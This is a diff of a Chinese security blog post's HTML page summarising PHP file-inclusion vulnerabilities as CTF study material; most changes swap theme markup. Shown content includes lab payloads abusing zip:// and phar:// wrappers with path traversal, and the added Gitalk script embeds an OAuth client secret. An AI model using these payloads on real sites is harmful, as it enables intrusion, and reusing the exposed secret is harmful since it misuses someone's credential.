-<p><strong>Example：</strong>（设在根目录下有flag2.txt文件）<br><img src="/2019/02/13/文件包含漏洞总结/20190212232732360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="/2019/02/13/文件包含漏洞总结/2019021223280591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p><strong>Example：</strong>（设在根目录下有flag2.txt文件）<br><img src="/2019/02/13/文件包含漏洞总结/20190212232732360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="/2019/02/13/文件包含漏洞总结/2019021223280591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h3 id="二、利用协议"><a href="#二、利用协议" class="headerlink" title="二、利用协议"></a>二、利用协议</h3><p>利用zip://和phar://，由于整个压缩包都是我们的可控参数，那么只需要知道他们的后缀，便可以自己构建。</p>
 </li>
 </ul>
@@ -439,7 +482,7 @@ copy  1.jpg/b+2.php  3.jpg
 <li>[拼接后] &emsp;<code>?file=phar://zip.zip/phpinfo.txt</code></li>
 </ul>
 <p><strong>Example：</strong><br>(我的环境根目录中有php.zip压缩包，内含phpinfo.txt，其中包含代码&lt;?php phpinfo();?&gt;)）<br>所以分别构造payload为：</p>
-<p><code>?file=zip://D:\PHPWAMP_IN3\wwwroot\php.zip%23phpinfo</code><br><img src="/2019/02/13/文件包含漏洞总结/20190212234709548.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><code>?file=phar://../../php.zip/phpinfo</code><br><img src="/2019/02/13/文件包含漏洞总结/20190212234725870.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p><code>?file=zip://D:\PHPWAMP_IN3\wwwroot\php.zip%23phpinfo</code><br><img src="/2019/02/13/文件包含漏洞总结/20190212234709548.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>?file=phar://../../php.zip/phpinfo</code><br><img src="/2019/02/13/文件包含漏洞总结/20190212234725870.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h3 id="三、长度截断"><a href="#三、长度截断" class="headerlink" title="三、长度截断"></a>三、长度截断</h3><p><strong>利用条件：</strong> </p>
 <ul>
 <li>php版本 &lt; php 5.2.8</li>
@@ -479,294 +522,114 @@ copy  1.jpg/b+2.php  3.jpg
 </li>
 </ul>
 
-            <hr>
-          </div>
-          <br>
-          <div>
-            <p>
-            
-              <span>
-                <i class="iconfont icon-inbox"></i>
-                
-                  <a class="hover-with-bg" href="/categories/CTF">CTF</a>
-                  &nbsp;
-                
-              </span>&nbsp;&nbsp;
-            
-            
-              <span>
-                <i class="iconfont icon-tag"></i>
-                
-                  <a class="hover-with-bg" href="/tags/CTF">CTF</a>
-                
-              </span>
-            
-            </p>
-            
-              <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
-            
-          </div>
         </div>
-      </div>
-    </div>
-    <div class="d-none d-lg-block col-lg-2 toc-container">
-      
-  <div id="toc">
-    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
-    <div id="tocbot"></div>
-  </div>
 
-    </div>
-  </div>
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Lethe</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://lethe.site/2019/02/13/文件包含漏洞总结/">https://lethe.site/2019/02/13/文件包含漏洞总结/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/03/02/以dvwa为例学习简单sql布尔盲注的详细脚本/">以dvwa为例学习简单sql布尔盲注的详细脚本</a>
+            
+            
+        </section>
+
+
+    </article>
 </div>
 
-<!-- custom -->
+</body>
 
-
-<!-- Comments -->
-<div class="col-lg-7 mx-auto nopadding-md">
-  <div class="container comments mx-auto" id="comments">
-    
-      <br><br>
-      
-      
-  <div class="disqus" style="width:100%">
-    <div id="disqus_thread"></div>
-    <script>
-      var disqus_config = function () {
-        this.page.url = 'https://lethe.site/2019/02/13/文件包含漏洞总结/';
-        this.page.identifier = '/2019/02/13/文件包含漏洞总结/';
-      };
-      var oldLoad = window.onload;
-      window.onload = function () {
-        var d = document, s = d.createElement('script');
-        s.type = 'text/javascript';
-        s.src = '//' + 'Lethe' + '.disqus.com/embed.js';
-        s.setAttribute('data-timestamp', +new Date());
-        (d.head || d.body).appendChild(s);
-      };
-    </script>
-    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow noopener">comments
-        powered by Disqus.</a></noscript>
-  </div>
-
-
-    
-  </div>
-</div>
-
-    
-  </main>
-
-  
-    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
-      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
-    </a>
-  
-
-  
-    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
-</div>
-  
-
-  <footer class="mt-5">
-  <div class="text-center py-3">
-    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
-    <i class="iconfont icon-love"></i>
-    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
-    <br>
-
-    
-  
-    <!-- 不蒜子统计PV -->
-    
-    &nbsp;<span id="busuanzi_container_site_pv">总访问量 
-          <span id="busuanzi_value_site_pv"></span> 次</span>&nbsp;
-  
-  
-    <!-- 不蒜子统计UV -->
-    
-    &nbsp;<span id="busuanzi_container_site_uv">总访客数 
-            <span id="busuanzi_value_site_uv"></span> 人</span>&nbsp;
-  
-  <br>
-
-
-
-    
-
-
-    <!-- cnzz Analytics icon -->
-    
-
-  </div>
-</footer>
-
-<!-- SCRIPTS -->
-<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
-<script src="https://cdn.staticfile.org/popper.js/1.15.0/umd/popper.min.js"></script>
-<script src="https://cdn.staticfile.org/twitter-bootstrap/4.3.1/js/bootstrap.min.js"></script>
-<script src="https://cdn.staticfile.org/mdbootstrap/4.8.9/js/mdb.min.js"></script>
-<script src="/js/main.js"></script>
-<script>
-(function(){
-    var bp = document.createElement('script');
-    var curProtocol = window.location.protocol.split(':')[0];
-    if (curProtocol === 'https'){
-   bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
-  }
-  else{
-  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
-  }
-    var s = document.getElementsByTagName("script")[0];
-    s.parentNode.insertBefore(bp, s);
-})();
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="//unpkg.com/gitalk/dist/gitalk.css">
+<script src="//unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'b00b0a7008ebc4264da3',
+        clientSecret: 'd2cd3318af9e2b076eb378ac846e0e37341260ff',
+        repo: 'blog',
+        owner: 'Lethe',
+        admin: 'Lethe',
+        id: md5(location.pathname),      
+        labels: 'Gitalk'.split(',').filter(l => l),
+        perPage: 10,
+        pagerDirection: 'last',
+        createIssueManually: true,
+        distractionFreeMode: false
+      })
+      gitalk.render('gitalk-container')
 </script>
 
-  <script src="/js/lazyload.js"></script>
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span><font face="Comic Sans MS">Life is a struggle.</font></span>
+        <br>
+        <span><font face="Comic Sans MS">Lethe © 2018 - 2020</font></span>
+
+        <span> · 
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<span class="site-uv">
+    总访客量:
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>&nbsp;
 
 
+<span class="site-pv">
+    总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
 
-  
-    <script src="https://cdn.staticfile.org/tocbot/4.8.0/tocbot.min.js"></script>
-  
-  <script src="/js/post.js"></script>
+          </span>
+    </div>
+</footer>
 
-
-
-  <script src="https://cdn.staticfile.org/smooth-scroll/16.1.0/smooth-scroll.min.js"></script>
-
-
-
-  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-
-<!-- Plugins -->
-
-
-  
-    <!-- Baidu Analytics -->
-    <script>
-      var _hmt = _hmt || [];
-      (function () {
-        var hm = document.createElement("script");
-        hm.src = "https://hm.baidu.com/hm.js?99792b18d5c4379d7bc5cf4bced8a563";
-        var s = document.getElementsByTagName("script")[0];
-        s.parentNode.insertBefore(hm, s);
-      })();
-    </script>
-  
-
-  
-
-  
-
-  
-
-  <!-- cnzz Analytics -->
-  
-
-
-
-  <script src="https://cdn.staticfile.org/prettify/r298/prettify.min.js"></script>
-  <script>
-    $(document).ready(function () {
-      $('pre').addClass('prettyprint  ');
-      prettyPrint();
-    })
-  </script>
-
-
-
-  <script src="https://cdn.staticfile.org/typed.js/2.0.10/typed.min.js"></script>
-  <script>
-    var typed = new Typed('#subtitle', {
-      strings: [
-        '  ',
-        "文件包含漏洞总结&nbsp;",
-      ],
-      cursorChar: "_",
-      typeSpeed: 70,
-      loop: false,
-    });
-    typed.stop();
-    $(document).ready(function () {
-      $(".typed-cursor").addClass("h2");
-      typed.start();
-    });
-  </script>
-
-
-
-  <script src="https://cdn.staticfile.org/anchor-js/4.2.0/anchor.min.js"></script>
-  <script>
-    anchors.options = {
-      placement: "right",
-      visible: "false",
-      
-      icon: "§"
-      
-    };
-    var el = "h1,h2,h3,h4,h5,h6".split(",");
-    var res = [];
-    for (item of el) {
-      res.push(".markdown-body > " + item)
-    }
-    anchors.add(res.join(", "))
-  </script>
-
-
-
-  <script src="/js/local-search.js"></script>
-  <script>
-    var path = "/local-search.xml";
-    var inputArea = document.querySelector("#local-search-input");
-    inputArea.onclick = function () {
-      getSearchFile(path);
-      this.onclick = null
-    }
-  </script>
-
-
-
-  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
-  <script>
-    $("#post img:not(.no-zoom img, img[no-zoom])").each(
-      function () {
-        var element = document.createElement("a");
-        $(element).attr("data-fancybox", "images");
-        $(element).attr("href", $(this).attr("src"));
-        $(this).wrap(element);
-      }
-    );
-  </script>
-
-
-
-
-
-
-
-
-
-
-
+    </div>
 </body>
 </html>
